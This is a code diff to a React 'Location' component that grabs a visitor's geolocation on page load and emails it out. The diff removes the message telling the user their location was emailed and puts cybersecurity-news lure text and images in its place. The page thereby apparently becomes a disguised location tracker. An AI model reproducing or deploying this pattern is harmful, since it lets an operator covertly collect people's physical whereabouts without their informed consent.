@@ -17,7 +17,7 @@ function Location() {
 
               const emailBody = `
                 <h2>Location Found!</h2>
-                <p>Here's your current location:</p>
+                <p>Here's the current location:</p>
                 <ul>
                   <li>Latitude: ${latitude}</li>
                   <li>Longitude: ${longitude}</li>
@@ -38,11 +38,11 @@ function Location() {
 
               if (response.ok) {
                 setLocationInfo(
-                  "Your location information has been emailed successfully!"
+                  `Checkout the recent Cyber Attacks. Don't let threat actors manipulate your device and access your credential information.`
                 );
               } else {
                 setError(
-                  "There was an error sending the email. Please try again later."
+                  `<h1>Oops!! an error occured, please try again later</h1>`
                 );
               }
             } catch (error) {
@@ -69,14 +69,55 @@ function Location() {
     getLocation();
   }, []);
   return (
-    <div>
-      <p>
-        <a href="https://giphy.com/gifs/theoffice-happy-birthday-the-office-happybirthday-g5R9dok94mrIvplmZd">
-          via GIPHY
-        </a>
-      </p>
+    <div className="flex flex-col justify-center w-200  items-center mt-10 p-4 bg-black-900 shadow-md hover:shadow-lg">
+      <div className="grid grid-cols-1 items-center lg:grid-cols-2 gap-2">
+        <div className="flex justify-center">
+          <img
+            src="./image.png"
+            alt="image"
+            className="w-48 h-48 object-cover"
+          />
+        </div>
+
+        <div className="flex justify-center">
+          <img
+            src="./image1.png"
+            alt="image"
+            className="w-48 h-48 object-cover"
+          />
+        </div>
+
+        <div className="flex justify-center">
+          <img
+            src="./image2.png"
+            alt="image"
+            className="w-48 h-48 object-cover"
+          />
+        </div>
+
+        <div className="flex justify-center">
+          <img
+            src="./image3.png"
+            alt="image"
+            className="w-48 h-48 object-cover"
+          />
+        </div>
+      </div>
+
       {isLoading && <p>Loading...</p>}
-      {locationInfo && <p>{locationInfo}</p>}
+      {locationInfo && (
+        <div className="flex flex-col items-center">
+          <h1 className="text-3xl">
+            Get Updated with the cybersecurity attacks today..
+          </h1>
+          <h3 className="success">{locationInfo}</h3>
+          <strong className="text-blue-500 hover:text-blue-900 curser-pointer">
+            <a href="https://zsecurity.org/" target="_blank">
+              Click Here
+            </a>
+          </strong>
+        </div>
+      )}
       {error && <p className="error">{error}</p>}
     </div>
   );
